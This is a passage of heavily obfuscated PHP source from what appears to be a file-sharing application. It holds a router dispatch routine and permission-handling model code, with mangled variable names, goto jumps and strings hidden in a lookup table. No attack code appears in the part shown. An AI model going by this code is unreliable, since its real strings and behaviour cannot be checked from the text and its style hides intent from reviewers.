=& $_SERVER[Ò°Ì”İ•]; $´ƒıÁÒ– = parse_url($_SERVER[$ı¤¯ñÆ•[1705]], PHP_URL_PATH); $˜ÉÉÊá¶ = $_SERVER[$ı¤¯ñÆ•[175]]; $ù‡½¬°ˆ = array_keys(static::$patterns); $šÔĞ¦Şª = array_values(static::$patterns); $×Å‡‡ÜÏ = !1; self::$routes = preg_replace($ı¤¯ñÆ•[1357], $ı¤¯ñÆ•[8], self::$routes); if (in_array($´ƒıÁÒ–, self::$routes)) { $¨å×Â±• = array_keys(self::$routes, $´ƒıÁÒ–); foreach ($¨å×Â±• as $Óêı) { if (self::$methods[$Óêı] == $˜ÉÉÊá¶ || self::$methods[$Óêı] == $ı¤¯ñÆ•[1706] || in_array($˜ÉÉÊá¶, self::$maps[$Óêı])) { $×Å‡‡ÜÏ = !0; if (!is_object(self::$callbacks[$Óêı])) { $·ÈÆœ¼¾ = explode($ı¤¯ñÆ•[8], self::$callbacks[$Óêı]); $À„½÷‹ = end($·ÈÆœ¼¾); $”Ş¥‚‘× = explode($ı¤¯ñÆ•[1289], $À„½÷‹); $ÓÉ€Ò”È = new $”Ş¥‚‘×[0](); $ÓÉ€Ò”È->{$”Ş¥‚‘×[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Óêı]); if (self::$halts) { return; } } } } } else { $«ÏÔ£±¹ = 0; foreach (self::$routes as $Óêı) { if (strpos($Óêı, $ı¤¯ñÆ•[4]) !== !1) { $Óêı = str_replace($ù‡½¬°ˆ, $šÔĞ¦Şª, $Óêı); } if (preg_match($ı¤¯ñÆ•[1707] . $Óêı . $ı¤¯ñÆ•[1708], $´ƒıÁÒ–, $òËÙÈËš)) { if (self::$methods[$«ÏÔ£±¹] == $˜ÉÉÊá¶ || self::$methods[$«ÏÔ£±¹] == $ı¤¯ñÆ•[1706] || !empty(self::$maps[$«ÏÔ£±¹]) && in_array($˜ÉÉÊá¶, self::$maps[$«ÏÔ£±¹])) { $×Å‡‡ÜÏ = !0; array_shift($òËÙÈËš); if (!is_object(self::$callbacks[$«ÏÔ£±¹])) { $·ÈÆœ¼¾ = explode($ı¤¯ñÆ•[8], self::$callbacks[$«ÏÔ£±¹]); $À„½÷‹ = end($·ÈÆœ¼¾); $”Ş¥‚‘× = explode($ı¤¯ñÆ•[1289], $À„½÷‹); $ÓÉ€Ò”È = new $”Ş¥‚‘×[0](); if (!method_exists($ÓÉ€Ò”È, $”Ş¥‚‘×[1])) { echo $ı¤¯ñÆ•[1709]; } else { call_user_func_array(array($ÓÉ€Ò”È, $”Ş¥‚‘×[1]), $òËÙÈËš); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$«ÏÔ£±¹], $òËÙÈËš); if (self::$halts) { return; } } } } $«ÏÔ£±¹++; } } if ($×Å‡‡ÜÏ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $÷çÍ…¿š =& $_SERVER[Ò°Ì”İ•]; header($_SERVER[$÷çÍ…¿š[1710]] . $÷çÍ…¿š[1711]); echo $÷çÍ…¿š[1712]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ı¤¯ñÆ•[1705]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto eÌŒª¡àÍ; Aîà¥Ö×ê”: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\x63\x65\x5f\141\165\164\150"; public function getAuth($ÑäÒãş) { $–‚‚í˜— =& $_SERVER[Ò°Ì”İ•]; $¦ã¥‹Ù• = $this->sourceAuthSelect($ÑäÒãş); $”³í›æ = array(); $¡¢»óû = array(); $êŒº«ò = 2 << 25; foreach ($¦ã¥‹Ù• as $ÎŠîÃ¤ï) { $ã×ˆåÛ§ = Model($–‚‚í˜—[583])->listData($ÎŠîÃ¤ï[$–‚‚í˜—[2077]]); if (!$ã×ˆåÛ§) { continue; } $”³í›æ[] = $ÎŠîÃ¤ï; $µÃ›İš = 0; if ($ÎŠîÃ¤ï[$–‚‚í˜—[201]] == SourceModel::TYPE_GROUP) { $µÃ›İš = $êŒº«ò * 2; } if ($ÎŠîÃ¤ï[$–‚‚í˜—[201]] == SourceModel::TYPE_USER) { $µÃ›İš = $êŒº«ò; } if ($ÎŠîÃ¤ï[$–‚‚í˜—[201]] == SourceModel::TYPE_USER && $ÎŠîÃ¤ï[$–‚‚í˜—[581]] == $–‚‚í˜—[241]) { $µÃ›İš = 0; } $¡¢»óû[] = $ã×ˆåÛ§[$–‚‚í˜—[499]] + $µÃ›İš; } array_multisort($¡¢»óû, SORT_DESC, $”³í›æ); return $”³í›æ; } public function sourceAuthSelect($­¶·„¨ä) { $öıó¦Ö³ =& $_SERVER[Ò°Ì”İ•]; static $±µ¡˜üç = array(); $¦¯èºÑŸ = is_array($­¶·„¨ä) ? !1 : !0; if ($¦¯èºÑŸ) { $­¶·„¨ä = array($­¶·„¨ä); } $ıññàê = array(); foreach ($­¶·„¨ä as $¯ñ†à”) { if (isset($±µ¡˜üç[$¯ñ†à”])) { $ıññàê[$¯ñ†à”] = $±µ¡˜üç[$¯ñ†à”]; } } if (count($ıññàê) == count($­¶·„¨ä)) { return $¦¯èºÑŸ ? $ıññàê[$­¶·„¨ä[0]] : $ıññàê; } $–Ä÷ıßÉ = $öıó¦Ö³[2155]; $ÆìŠï÷ø = array($öıó¦Ö³[204] => array($öıó¦Ö³[7], $­¶·„¨ä)); $Ğ¼şê¿¢ = $this->field($–Ä÷ıßÉ)->order($öıó¦Ö³[487])->where($ÆìŠï÷ø)->select(); $µ¤ØêÎ½ = array_to_keyvalue_group($Ğ¼şê¿¢, $öıó¦Ö³[204]); foreach ($­¶·„¨ä as $¯ñ†à”) { $±µ¡˜üç[$¯ñ†à”] = $µ¤ØêÎ½[$¯ñ†à”] ? $µ¤ØêÎ½[$¯ñ†à”] : array(); } if ($¦¯èºÑŸ) { return $Ğ¼şê¿¢; } return $µ¤ØêÎ½; } public function setAuth($•Çöä˜Ò, $Õ çå—) { $–›ÒÚø¼ =& $_SERVER[Ò°Ì”İ•]; $—ÔúÀ™ä = Model($–›ÒÚø¼[1417])->sourceInfo($•Çöä˜Ò); if (!$—ÔúÀ™ä) { return !1; } if ($—ÔúÀ™ä[$–›ÒÚø¼[201]] != SourceModel::TYPE_GROUP) { return !1; } $º‡ÓÕĞÏ = 1; $°”‚ÙŠ“ = $—ÔúÀ™ä[$–›ÒÚø¼[581]]; if ($°”‚ÙŠ“ != $º‡ÓÕĞÏ) { $¥Í»ÛÛ = array($–›ÒÚø¼[1969] => $°”‚ÙŠ“); $¡ü‰Œ™é = Model($–›ÒÚø¼[2063])->field($–›ÒÚø¼[1768])->where($¥Í»ÛÛ)->select(); $¡ü‰Œ™é = array_to_keyvalue($¡ü‰Œ™é, $–›ÒÚø¼[12], $–›ÒÚø¼[1768]); } $ñ „à•È = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $»‹ÜÓÖå = array(); foreach ($Õ çå— as $Ùœ¤Â–‚) { if (!in_array($Ùœ¤Â–‚[$–›ÒÚø¼[201]], $ñ „à•È)) { show_json(LNG($–›ÒÚø¼[2156]), !1); } if ($°”‚ÙŠ“ != $º‡ÓÕĞÏ) { if ($Ùœ¤Â–‚[$–›ÒÚø¼[201]] == SourceModel::TYPE_GROUP) { } if ($Ùœ¤Â–‚[$–›ÒÚø¼[581]] != 0 && !in_array($Ùœ¤Â–‚[$–›ÒÚø¼[581]], $¡ü‰Œ™é)) { } } if ($Ùœ¤Â–‚[$–›ÒÚø¼[581]] == 0) { $Ùœ¤Â–‚[$–›ÒÚø¼[201]] = SourceModel::TYPE_USER; } $»‹ÜÓÖå[] = array($–›ÒÚø¼[204] => $•Çöä˜Ò, $–›ÒÚø¼[201] => intval($Ùœ¤Â–‚[$–›ÒÚø¼[201]]), $–›ÒÚø¼[581] => intval($Ùœ¤Â–‚[$–›ÒÚø¼[581]]), $–›ÒÚø¼[2077] => intval($Ùœ¤Â–‚[$–›ÒÚø¼[2077]]) ? intval($Ùœ¤Â–‚[$–›ÒÚø¼[2077]]) : 0, $–›ÒÚø¼[2138] => intval($Ùœ¤Â–‚[$–›ÒÚø¼[2138]]) ? intval($Ùœ¤Â–‚[$–›ÒÚø¼[2138]]) : -1); } $this->where(array($–›ÒÚø¼[503] => $•Çöä˜Ò))->delete(); $this->addAll($»‹ÜÓÖå); return !0; } public function authClear($‡Ÿûş†) { $Šú”°ìû =& $_SERVER[Ò°Ì”İ•]; $ÎÍ¤Á­™ = Model($Šú”°ìû[1417])->sourceInfo($‡Ÿûş†); $ñã×¯”€ = array($‡Ÿûş†); if ($ÎÍ¤Á­™[$Šú”°ìû[497]] == $Šú”°ìû[102]) { $‰ÒØË¦Ñ = array($Šú”°ìû[667] => array($Šú”°ìû[627], $ÎÍ¤Á­™[$Šú”°ìû[596]] . $‡Ÿûş† . $Šú”°ìû[628])); $ñã×¯”€ = Model($Šú”°ìû[1417])->field($Šú”°ìû[503])->where($‰ÒØË¦Ñ)->getField($Šú”°ìû[204], !0); $ñã×¯”€[] = $‡Ÿûş†; } $this->where(array($Šú”°ìû[503] => array($Šú”°ìû[504], $ñã×¯”€)))->delete(); return !0; } public function getAllChildren($ş‚Ş»ÛÊ) { $«ÉóãõÖ =& $_SERVER[Ò°Ì”İ•]; $şÉöÎà = Model($«ÉóãõÖ[1417])->sourceInfo($ş‚Ş»ÛÊ); if ($şÉöÎà[$«ÉóãõÖ[497]] != $«ÉóãõÖ[102]) { return $this->sourceListAuth(array($ş‚Ş»ÛÊ)); } if ($şÉöÎà[$«ÉóãõÖ[201]] != SourceModel::TYPE_GROUP) { return array(); } $¯¶òµ£ı = 1; $ö¹Ò•øæ = array($ş‚Ş»ÛÊ); if ($şÉöÎà[$«ÉóãõÖ[203]] == $«ÉóãõÖ[241] && $şÉöÎà[$«ÉóãõÖ[581]] != $¯¶òµ£ı) { $ö¹Ò•øæ = $this->groupChidldAllRootSource($şÉöÎà[$«ÉóãõÖ[581]]); } $³¡ĞÈ× = $this->field($«ÉóãõÖ[204])->group($«ÉóãõÖ[204])->select(); $³¡ĞÈ× = array_to_keyvalue($³¡ĞÈ×, $«ÉóãõÖ[12], $«ÉóãõÖ[204]); if (!$³¡ĞÈ×) { return array(); } $¼¥†ßöü = $«ÉóãõÖ[2157]; $¥Úìâ”© = array($«ÉóãõÖ[204] => array($«ÉóãõÖ[7], $³¡ĞÈ×), $«ÉóãõÖ[517] => $«ÉóãõÖ[241]); $¿‹  ÌÙ = Model($«ÉóãõÖ[898])->field($¼¥†ßöü)->where($¥Úìâ”©)->select(); $ş•¨‡Ñå = array($ş‚Ş»ÛÊ); foreach ($¿‹  ÌÙ as $÷Ğ¸©») { foreach ($ö¹Ò•øæ as $ì¦ğò) { $ş£¿î = $«ÉóãõÖ[50] . $ì¦ğò . $«ÉóãõÖ[50]; $²ãĞÅ× = $÷Ğ¸©»[$«ÉóãõÖ[596]] . $÷Ğ¸©»[$«ÉóãõÖ[204]] . $«ÉóãõÖ[50]; if (strstr($²ãĞÅ×, $ş£¿î)) { $ş•¨‡Ñå[] = $÷Ğ¸©»[$«ÉóãõÖ[204]]; break; } } } return $this->sourceListAuth($ş•¨‡Ñå); } private function sourceListAuth($üèçØıÇ) { $Çšü’— =& $_SERVER[Ò°Ì”İ•]; $àä§• = Model($Çšü’—[1417])->sourceListInfo($üèçØıÇ, !0); $ÎŠêÇÈÉ = $this->sourceAuthSelect($üèçØıÇ); $üµ‰Ó›ù = array(); $ùÃ´şÓ = array(); foreach ($àä§• as $ü¥ğ¹€½) { unset($ü¥ğ¹€½[$Çšü’—[541]]); unset($ü¥ğ¹€½[$Çšü’—[539]]); unset($ü¥ğ¹€½[$Çšü’—[499]]); unset($ü¥ğ¹€½[$Çšü’—[101]]); $Øñæ˜Áİ = $ÎŠêÇÈÉ[$ü¥ğ¹€½[$Çšü’—[204]]]; if (!$Øñæ˜Áİ) { continue; } $ü¥ğ¹€½[$Çšü’—[2158]] = $this->authTargetInfo($Øñæ˜Áİ); $ü¥ğ¹€½[$Çšü’—[594]] = rtrim($ü¥ğ¹€½[$Çšü’—[600]], $Çšü’—[8]) . $Çšü’—[8] . ltrim($ü¥ğ¹€½[$Çšü’—[594]], $Çšü’—[8]); $üµ‰Ó›ù[] = $ü¥ğ¹€½; $­ßˆÂ›£ = count(explode($Çšü’—[8], trim($ü¥ğ¹€½[$Çšü’—[594]], $Çšü’—[8]))); $ùÃ´şÓ[] = $­ßˆÂ›£ + ($ü¥ğ¹€½[$Çšü’—[33]] == $Çšü’—[89] ? 0 : 1000); } array_multisort($ùÃ´şÓ, SORT_ASC, $üµ‰Ó›ù); return $üµ‰Ó›ù; } private function groupChidldAllRootSource($é›Î¡³š) { $ø½â…ä— =& $_SERVER[Ò°Ì”İ•]; $ãîÂ¥ó = Model($ø½â…ä—[2159])->groupChildrenAll($é›Î¡³š); $Üõœ‰Í§ = array($ø½â…ä—[203] => 0, $ø½â…ä—[581] => array($ø½â…ä—[7], $ãîÂ¥ó), $ø½â…ä—[201] => SourceModel::TYPE_GROUP); $³×Öö¾Â = Model($ø½â…ä—[898])->field($ø½â…ä—[204])->where($Üõœ‰Í§)->select(); $³×Öö¾Â = array_to_keyvalue($³×Öö¾Â, $ø½â…ä—[12], $ø½â…ä—[204]); return $³×Öö¾Â; } private function authTargetInfo($ÆÈ›ê¾) { $„”ÛÒñâ =& $_SERVER[Ò°Ì”İ•]; $‡œ³ç›ï = array(); $–¦¶ïù× = array(); $ÀóöŸÛÛ = 2 << 25; foreach ($ÆÈ›ê¾ as $¿Ûäİí´) { $˜°îËƒß = Model($„”ÛÒñâ[583])->listData($¿Ûäİí´[$„”ÛÒñâ[2077]]); if (!$˜°îËƒß) { continue; } if ($¿Ûäİí´[$„”ÛÒñâ[201]] == SourceModel::TYPE_USER) { $İö´œ¢Ø = Model($„”ÛÒñâ[589])->getInfoSimpleOuter($¿Ûäİí´[$„”ÛÒñâ[581]]); if ($İö´œ¢Ø[$„”ÛÒñâ[1768]] == $„”ÛÒñâ[1269]) { continue; } if ($İö´œ¢Ø[$„”ÛÒñâ[1768]] == $„”ÛÒñâ[241]) { $İö´œ¢Ø[$„”ÛÒñâ[32]] = LNG($„”ÛÒñâ[2160]); } } else { $İö´œ¢Ø = Model($„”ÛÒñâ[597])->getInfoSimple($¿Ûäİí´[$„”ÛÒñâ[581]]); } if (!$İö´œ¢Ø) { continue; } $İö´œ¢Ø[$„”ÛÒñâ[552]] = $˜°îËƒß; $‡œ³ç›ï[] = $İö´œ¢Ø; $ª¨œ‹Ûß = 0; if ($¿Ûäİí´[$„”ÛÒñâ[201]] == SourceModel::TYPE_GROUP) { $ª¨œ‹Ûß = $ÀóöŸÛÛ * 2; } if ($¿Ûäİí´[$„”ÛÒñâ[201]] == SourceModel::TYPE_USER) { $ª¨œ‹Ûß = $ÀóöŸÛÛ; } if ($¿Ûäİí´[$„”ÛÒñâ[201]] == SourceModel::TYPE_USER && $¿Ûäİí´[$„”ÛÒñâ[581]] == $„”ÛÒñâ[241]) { $ª¨œ‹Ûß = 0; } $–¦¶ïù×[] = $˜°îËƒß[$„”ÛÒñâ[499]] + $ª¨œ‹Ûß; } array_multisort($–¦¶ïù×, SORT_DESC, $‡œ³ç›ï); return $‡œ³ç›ï; } public function getAllChildrenByUser($Î™³Ğğü, $ä¯ Œ) { $ëÂıÀÓ =& $_SERVER[Ò°Ì”İ•]; $­×º¤¶¿ = Model($ëÂıÀÓ[609])->getInfo($ä¯ Œ); if (!$ä¯ Œ || !$Î™³Ğğü || !$­×º¤¶¿) { return array(); } $û•ÂŸ¡ = Model($ëÂıÀÓ[1417])->sourceInfo($Î™³Ğğü); $’ÇìÂ‘Ë = array(); $ØìÍ¹ = 1; if ($û•ÂŸ¡[$ëÂıÀÓ[203]] == $ëÂıÀÓ[241] && $û•ÂŸ¡[$ëÂıÀÓ[581]] != $ØìÍ¹ && $this->groupContainUser($û•ÂŸ¡[$ëÂıÀÓ[581]], $ä¯ Œ)) { foreach ($­×º¤¶¿[$ëÂıÀÓ[2161]] as $¦­áÄèÆ) { $ı‡Éú = Model($ëÂıÀÓ[597])->getInfo($¦­áÄèÆ[$ëÂıÀÓ[1969]]); $¡©®¤ÖŒ = Model($ëÂıÀÓ[609])->getInfoSimpleOuter($ä¯ Œ); $¡©®¤ÖŒ[$ëÂıÀÓ[552]] = $¦­áÄèÆ[$ëÂıÀÓ[499]]; if (Model($ëÂıÀÓ[583])->authCheckAction($¦­áÄèÆ[$ëÂıÀÓ[499]][$ëÂıÀÓ[499]], $ëÂıÀÓ[1990])) { continue; } $âœŠ€æš = array($ëÂıÀÓ[32] => $ëÂıÀÓ[1289] . $ı‡Éú[$ëÂıÀÓ[32]], $ëÂıÀÓ[204] => $ı‡Éú[$ëÂıÀÓ[101]][$ëÂıÀÓ[204]], $ëÂıÀÓ[98] => KodIO::make($ı‡Éú[$ëÂıÀÓ[101]][$ëÂıÀÓ[204]]), $ëÂıÀÓ[203] => $ëÂıÀÓ[241], $ëÂıÀÓ[201] => $ëÂıÀÓ[590], $ëÂıÀÓ[33] => $ëÂıÀÓ[631], $ëÂıÀÓ[594] => $ı‡Éú[$ëÂıÀÓ[601]], $ëÂıÀÓ[1969] => $ı‡Éú[$ëÂıÀÓ[1969]], $ëÂıÀÓ[598] => $ı‡Éú[$ëÂıÀÓ[203]], $ëÂıÀÓ[2158] => array($¡©®¤ÖŒ)); $’ÇìÂ‘Ë[$âœŠ€æš[$ëÂıÀÓ[204]]] = $âœŠ€æš; } } $¬„ÁÎ¿ë = array(); $„¬ì”Õ­ = $this->getAllChildren($Î™³Ğğü); foreach ($„¬ì”Õ­ as $ˆêğß„Ÿ) { $øØÚöññ = !1; foreach ($ˆêğß„Ÿ[$ëÂıÀÓ[2158]] as $ñÁŠ²) { if ($ñÁŠ²[$ëÂıÀÓ[1768]]) { if ($ñÁŠ²[$ëÂıÀÓ[1768]] == $ä¯ Œ) { $øØÚöññ = !0; break; } } if ($ñÁŠ²[$ëÂıÀÓ[1969]]) { if ($this->groupContainUser($ñÁŠ²[$ëÂıÀÓ[1969]], $ä¯ Œ)) { $øØÚöññ = !0; break; } } } if ($øØÚöññ) { $¬„ÁÎ¿ë[] = $ˆêğß„Ÿ; } $×Ğ¢Í¯ = $ˆêğß„Ÿ[$ëÂıÀÓ[204]]; if (isset($’ÇìÂ‘Ë[$×Ğ¢Í¯])) { $ˆêğß„Ÿ[$ëÂıÀÓ[2158]][] = $’ÇìÂ‘Ë[$×Ğ¢Í¯][0]; $’ÇìÂ‘Ë[$×Ğ¢Í¯] = !1; } } $’ÇìÂ‘Ë = array_filter(array_values($’ÇìÂ‘Ë)); $¬„ÁÎ¿ë = array_merge($’ÇìÂ‘Ë, $¬„ÁÎ¿ë); return $¬„ÁÎ¿ë; } public function setAllChildrenByUser($«£öŠè, $óò¦×»í, $ìŠâíª“) { $¶Áöë— =& $_SERVER[Ò°Ì”İ•]; $¾“½ÁÀ = $this->getAllChildrenByUser($«£öŠè, $óò¦×»í); if (!$ìŠâíª“ || !$¾“½ÁÀ) { return !1; } foreach ($¾“½ÁÀ as $ÖÎøéÜ¡) { $°«şÖ¿ş = array(); foreach ($ÖÎøéÜ¡[$¶Áöë—[2158]] as $­âı‚âı) { $ùÄ³âŸé = $­âı‚âı[$¶Áöë—[552]]; $ÌêÛ½º = $­âı‚âı[$¶Áöë—[1768]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‹‡©É¼ã = $­âı‚âı[$¶Áöë—[1768]] ? $­âı‚âı[$¶Áöë—[1768]] : $­âı‚âı[$¶Áöë—[1969]]; if ($­âı‚âı[$¶Áöë—[1768]] && $­âı‚âı[$¶Áöë—[1768]] == $óò¦×»í) { continue; } $°«şÖ¿ş[] = array($¶Áöë—[204] => $ÖÎøéÜ¡[$¶Áöë—[204]], $¶Áöë—[201] => $ÌêÛ½º, $¶Áöë—[581] => intval($‹‡©É¼ã), $¶Áöë—[2077] => isset($ùÄ³âŸé[$¶Áöë—[487]]) ? intval($ùÄ³âŸé[$¶Áöë—[487]]) : 0, $¶Áöë—[2138] => isset($ùÄ³âŸé[$¶Áöë—[2138]]) ? intval($ùÄ³âŸé[$¶Áöë—[2138]]) : -1); } $°«şÖ¿ş[] = array($¶Áöë—[204] => $ÖÎøéÜ¡[$¶Áöë—[204]], $¶Áöë—[201] => SourceModel::TYPE_USER, $¶Áöë—[581] => intval($óò¦×»í), $¶Áöë—[2077] => intval($ìŠâíª“), $¶Áöë—[2138] => -1); $this->where(array($¶Áöë—[503] => $ÖÎøéÜ¡[$¶Áöë—[204]]))->delete(); $this->addAll($°«şÖ¿ş); } return !0; } public function get($Üö¼¹ÒÖ) { $®€ä” = $this->getSourceList(array($Üö¼¹ÒÖ), !0); return $®€ä”[0]; } public function getSourceList($šâé®âŸ, $ÀËîæ = false, $è¼¡Í™õ = false) { $‘ÀĞÀñ™ =& $_SERVER[Ò°Ì”İ•]; if (!$šâé®âŸ) { return array(); } $ÀÔÙß­Ø = Model($‘ÀĞÀñ™[1417]); if (!$ÀËîæ && count($šâé®âŸ) == 1) { $ÀËîæ = array(); $ÀËîæ[$šâé®âŸ[0]] = $ÀÔÙß­Ø->sourceInfo($šâé®âŸ[0]); } if (!$ÀËîæ) { $¾æœ‡‡¿ = array($‘ÀĞÀñ™[503] => array($‘ÀĞÀñ™[504], $šâé®âŸ)); $ÀËîæ = $ÀÔÙß­Ø->field($‘ÀĞÀñ™[2162])->where($¾æœ‡‡¿)->select(); $ÀËîæ = array_to_keyvalue($ÀËîæ, $‘ÀĞÀñ™[204]); } $Ì×’åş = $šâé®âŸ; foreach ($ÀËîæ as $¶¹æì¤ => $ŠßÑ¡ßú) { $Ÿ·¤ù·¯ = $ÀÔÙß­Ø->parentLevelArray($ŠßÑ¡ßú[$‘ÀĞÀñ™[596]]); $Ì×’åş = array_merge($Ì×’åş, array($¶¹æì¤), array_reverse($Ÿ·¤ù·¯)); } $Ì×’åş = array_values(array_unique($Ì×’åş)); if (!$Ì×’åş) { return array(); } $Ìó‹é†  = $this->sourceAuthSelect($Ì×’åş); $±ëºÄ›® = array(); foreach ($Ì×’åş as $ÉÓ”ŠØ¥) { if (isset($Ìó‹é† [$ÉÓ”ŠØ¥])) { $±ëºÄ›®[$ÉÓ”ŠØ¥] = $Ìó‹é† [$ÉÓ”ŠØ¥]; } } $È¼­‘ô = $this->userIsRoot($è¼¡Í™õ); $ƒø‰òÜ = AuthModel::authAll(); $¡ã’¿™ë = array($‘ÀĞÀñ™[500] => $ƒø‰òÜ, $‘ÀĞÀñ™[2163] => array($‘ÀĞÀñ™[505] => 0, $‘ÀĞÀñ™[1975] => $ƒø‰òÜ, $‘ÀĞÀñ™[506] => LNG($‘ÀĞÀñ™[2164]), $‘ÀĞÀñ™[1992] => $‘ÀĞÀñ™[2165])); $Ç”ùÇø = array(); foreach ($ÀËîæ as $ÉÓ”ŠØ¥ => $şŞàÛ¾ª) { if ($È¼­‘ô && $GLOBALS[$‘ÀĞÀñ™[6]][$‘ÀĞÀñ™[1988]]) { $Ç”ùÇø[$ÉÓ”ŠØ¥] = $¡ã’¿™ë; continue; } $Ç”ùÇø[$ÉÓ”ŠØ¥] = $this->makeSourceAuth($şŞàÛ¾ª, $±ëºÄ›®, $è¼¡Í™õ); } return $Ç”ùÇø; } public function authDeepCheck($Ë‹Öñê³, $é·ğØ‹ = false) { $ÂÁşÎÏ =& $_SERVER[Ò°Ì”İ•]; $é·ğØ‹ = $é·ğØ‹ ? $é·ğØ‹ : USER_ID; $ô…×î›õ = $this->makeAuthDeep($é·ğØ‹); if (!in_array($Ë‹Öñê³, $ô…×î›õ[$ÂÁşÎÏ[2166]])) { return !1; } $³˜íÜŒì = array(); foreach ($ô…×î›õ[$ÂÁşÎÏ[2167]] as $‘Ê‰‹ãá => $ûÚü—Æ) { if (!in_array($Ë‹Öñê³, $ûÚü—Æ)) { continue; } $³˜íÜŒì[] = $‘Ê‰‹ãá; } if (!$³˜íÜŒì) { return !1; } $×‚Û›§ = $³˜íÜŒì ? $³˜íÜŒì[0] : $Ë‹Öñê³; return array($ÂÁşÎÏ[500] => -1, $ÂÁşÎÏ[552] => array($ÂÁşÎÏ[505] => $ÂÁşÎÏ[1269], $ÂÁşÎÏ[1975] => $ÂÁşÎÏ[241], $ÂÁşÎÏ[506] => LNG($ÂÁşÎÏ[2168]), $ÂÁşÎÏ[1992] => $ÂÁşÎÏ[2169]), $ÂÁşÎÏ[2170] => LNG($ÂÁşÎÏ[2171]), $ÂÁşÎÏ[2172] => $this->sourceAuthInfo($×‚Û›§)); } protected function makeAuthDeep($óš‹áƒ† = false) { $‘ëöäŞ =& $_SERVER[Ò°Ì”İ•]; static $Ö»ïƒèó = array(); $óš‹áƒ† = $óš‹áƒ† ? $óš‹áƒ† : USER_ID; if (isset($Ö»ïƒèó[$óš‹áƒ†])) { return $Ö»ïƒèó[$óš‹áƒ†]; } $³Ü‚­ = Model($‘ëöäŞ[2173])->listData(); $„ŞÅÔËÚ = array(); foreach ($³Ü‚­ as $Çôòª‚Ë) { if ($Çôòª‚Ë[$‘ëöäŞ[499]] == 0 && $Çôòª‚Ë[$‘ëöäŞ[1991]] == $‘ëöäŞ[102]) { $„ŞÅÔËÚ[] = $Çôòª‚Ë[$‘ëöäŞ[487]]; } } $„ªìğ„‘ = $this->userGroupParents($óš‹áƒ†); $İçâÌö¾ = array($‘ëöäŞ[201] => SourceModel::TYPE_USER, $‘ëöäŞ[581] => $óš‹áƒ†); if ($„ªìğ„‘) { $İçâÌö¾ = array(array($‘ëöäŞ[201] => SourceModel::TYPE_USER, $‘ëöäŞ[581] => $óš‹áƒ†), array($‘ëöäŞ[201] => SourceModel::TYPE_GROUP, $‘ëöäŞ[581] => array($‘ëöäŞ[504], $„ªìğ„‘)), $‘ëöäŞ[1073] => $‘ëöäŞ[2071]); } $Ï¸À¿Â÷ = $this->field($‘ëöäŞ[2174])->where($İçâÌö¾)->select(); $ĞğëòÕ = array(); $ßğÓæè = array_to_keyvalue_group($Ï¸À¿Â÷, $‘ëöäŞ[204]); foreach ($ßğÓæè as $º†äÆ¸Ç => $€öÀ“Øå) { $ª„ìª†… = $this->authArrayCheck($€öÀ“Øå, $óš‹áƒ†); if ($ª„ìª†…[$‘ëöäŞ[500]] > 0) { $ĞğëòÕ[] = $º†äÆ¸Ç . $‘ëöäŞ[12]; } } if ($„ªìğ„‘) { $Ğ«öØÍ² = Model($‘ëöäŞ[597]); foreach ($„ªìğ„‘ as $£¾ËÅŒ¯) { $Õ÷ÄÌ´Ã = $Ğ«öØÍ²->getInfo($£¾ËÅŒ¯); if (!$Õ÷ÄÌ´Ã || !is_array($Õ÷ÄÌ´Ã[$‘ëöäŞ[101]])) { continue; } $ĞğëòÕ[] = $Õ÷ÄÌ´Ã[$‘ëöäŞ[101]][$‘ëöäŞ[204]]; } } $®§ß„¾ = array(); $æÓæä¶ù = $„ªìğ„‘; $‰¢û¢ó¸ = Model($‘ëöäŞ[1417]); $Ğ«öØÍ² = Model($‘ëöäŞ[597]); $†ï°­…º = array(); $—Š¿ª÷ = array(); $™£òç×‚ = array(); $ÃàŠƒí£ = array(); if ($ĞğëòÕ) { $úÑ®İë™ = $‰¢û¢ó¸->where(array($‘ëöäŞ[204] => array($‘ëöäŞ[504], $ĞğëòÕ)))->select(); foreach ($úÑ®İë™ as $Âïíƒµ) { if ($Âïíƒµ[$‘ëöäŞ[517]] == $‘ëöäŞ[102]) { continue; } $°ïŸÊ¡ï = $‰¢û¢ó¸->parentLevelArray($Âïíƒµ[$‘ëöäŞ[596]]); $®§ß„¾ = array_merge($®§ß„¾, $°ïŸÊ¡ï); $æÓæä¶ù[] = $Âïíƒµ[$‘ëöäŞ[581]]; $†ï°­…º[$Âïíƒµ[$‘ëöäŞ[204]]] = $°ïŸÊ¡ï; $—Š¿ª÷[$Âïíƒµ[$‘ëöäŞ[204]]] = $Âïíƒµ[$‘ëöäŞ[581]]; } } $æÓæä¶ù = array_values(array_unique($æÓæä¶ù)); $ßí¨«é· = $æÓæä¶ù; foreach ($ßí¨«é· as $£¾ËÅŒ¯) { $Õ÷ÄÌ´Ã = $Ğ«öØÍ²->getInfo($£¾ËÅŒ¯); $°ïŸÊ¡ï = $‰¢û¢ó¸->parentLevelArray($Õ÷ÄÌ´Ã[$‘ëöäŞ[596]]); $æÓæä¶ù = array_merge($æÓæä¶ù, $°ïŸÊ¡ï); } $æÓæä¶ù = array_values(array_unique($æÓæä¶ù)); foreach ($æÓæä¶ù as $£¾ËÅŒ¯) { $Õ÷ÄÌ´Ã = $Ğ«öØÍ²->getInfo($£¾ËÅŒ¯); $®§ß„¾[] = $Õ÷ÄÌ´Ã[$‘ëöäŞ[101]][$‘ëöäŞ[204]]; $™£òç×‚[$£¾ËÅŒ¯] = $Õ÷ÄÌ´Ã[$‘ëöäŞ[101]][$‘ëöäŞ[204]]; $ÃàŠƒí£[$£¾ËÅŒ¯] = $‰¢û¢ó¸->parentLevelArray($Õ÷ÄÌ´Ã[$‘ëöäŞ[596]]); } foreach ($†ï°­…º as $®÷ĞÄëÅ => $†Ê¨ïÁ ) { $Õßü³øĞ = $—Š¿ª÷[$®÷ĞÄëÅ]; if (!$Õßü³øĞ || !$™£òç×‚[$Õßü³øĞ]) { continue; } $¶Á·¨’ª = array(); foreach ($ÃàŠƒí£[$Õßü³øĞ] as $£¾ËÅŒ¯) { $¶Á·¨’ª[] = $™£òç×‚[$£¾ËÅŒ¯]; } $†ï°­…º[$®÷ĞÄëÅ] = 